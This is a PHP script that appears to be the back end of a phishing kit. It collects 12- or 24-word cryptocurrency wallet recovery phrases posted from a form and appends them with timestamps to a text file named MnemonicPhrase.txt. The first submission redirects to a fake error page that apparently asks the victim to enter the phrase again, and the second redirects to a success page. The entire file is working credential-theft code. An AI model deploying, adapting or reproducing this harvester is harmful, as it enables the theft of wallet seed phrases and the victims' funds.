<?php 
$type =  isset($_POST['type']) ? addslashes(trim($_POST['type'])) : '';
$error =  isset($_POST['error']) ? addslashes(trim($_POST['error'])) : '0';
$w1 =  isset($_POST['w1']) ? addslashes(trim($_POST['w1'])) : '';
$w2 =  isset($_POST['w2']) ? addslashes(trim($_POST['w2'])) : '';
$w3 =  isset($_POST['w3']) ? addslashes(trim($_POST['w3'])) : '';
$w4 =  isset($_POST['w4']) ? addslashes(trim($_POST['w4'])) : '';
$w5 =  isset($_POST['w5']) ? addslashes(trim($_POST['w5'])) : '';
$w6 =  isset($_POST['w6']) ? addslashes(trim($_POST['w6'])) : '';
$w7 =  isset($_POST['w7']) ? addslashes(trim($_POST['w7'])) : '';
$w8 =  isset($_POST['w8']) ? addslashes(trim($_POST['w8'])) : '';
$w9 =  isset($_POST['w9']) ? addslashes(trim($_POST['w9'])) : '';
$w10 =  isset($_POST['w10']) ? addslashes(trim($_POST['w10'])) : '';
$w11 =  isset($_POST['w11']) ? addslashes(trim($_POST['w11'])) : '';
$w12 =  isset($_POST['w12']) ? addslashes(trim($_POST['w12'])) : '';
$w13 =  isset($_POST['w13']) ? addslashes(trim($_POST['w13'])) : '';
$w14 =  isset($_POST['w14']) ? addslashes(trim($_POST['w14'])) : '';
$w15 =  isset($_POST['w15']) ? addslashes(trim($_POST['w15'])) : '';
$w16 =  isset($_POST['w16']) ? addslashes(trim($_POST['w16'])) : '';
$w17 =  isset($_POST['w17']) ? addslashes(trim($_POST['w17'])) : '';
$w18 =  isset($_POST['w18']) ? addslashes(trim($_POST['w18'])) : '';
$w19 =  isset($_POST['w19']) ? addslashes(trim($_POST['w19'])) : '';
$w20 =  isset($_POST['w20']) ? addslashes(trim($_POST['w20'])) : '';
$w21 =  isset($_POST['w21']) ? addslashes(trim($_POST['w21'])) : '';
$w22 =  isset($_POST['w22']) ? addslashes(trim($_POST['w22'])) : '';
$w23 =  isset($_POST['w23']) ? addslashes(trim($_POST['w23'])) : '';
$w24 =  isset($_POST['w24']) ? addslashes(trim($_POST['w24'])) : '';
if($error=='1'){
  $time = date('Y-m-d H:i:s', time());
  $dat = $time.'-------------------------------------------------------'.PHP_EOL;
  if($type=='12'){
    $dat .= $w1.' '.$w2.' '.$w3.' '.$w4.' '.$w5.' '.$w6.' '.$w7.' '.$w8.' '.$w9.' '.$w10.' '.$w11.' '.$w12.PHP_EOL.PHP_EOL;
    $file = 'MnemonicPhrase.txt';
  }else{
    $dat .= $w1.' '.$w2.' '.$w3.' '.$w4.' '.$w5.' '.$w6.' '.$w7.' '.$w8.' '.$w9.' '.$w10.' '.$w11.' '.$w12.' '.$w13.' '.$w14.' '.$w15.' '.$w16.' '.$w17.' '.$w18.' '.$w19.' '.$w20.' '.$w21.' '.$w22.' '.$w23.' '.$w24.PHP_EOL.PHP_EOL;
    $file = 'MnemonicPhrase.txt';
  }
  @file_put_contents($file, $dat, FILE_APPEND);
  echo 'success.php';
}else{
  $time = date('Y-m-d H:i:s', time());
  $dat = $time.'-------------------------------------------------------'.PHP_EOL;
  if($type=='12'){
    $dat .= $w1.' '.$w2.' '.$w3.' '.$w4.' '.$w5.' '.$w6.' '.$w7.' '.$w8.' '.$w9.' '.$w10.' '.$w11.' '.$w12.PHP_EOL.PHP_EOL;
    $file = 'MnemonicPhrase.txt';
  }else{
    $dat .= $w1.' '.$w2.' '.$w3.' '.$w4.' '.$w5.' '.$w6.' '.$w7.' '.$w8.' '.$w9.' '.$w10.' '.$w11.' '.$w12.' '.$w13.' '.$w14.' '.$w15.' '.$w16.' '.$w17.' '.$w18.' '.$w19.' '.$w20.' '.$w21.' '.$w22.' '.$w23.' '.$w24.PHP_EOL.PHP_EOL;
    $file = 'MnemonicPhrase.txt';
  }
  @file_put_contents($file, $dat, FILE_APPEND);
  echo 'words.php?error=1';
}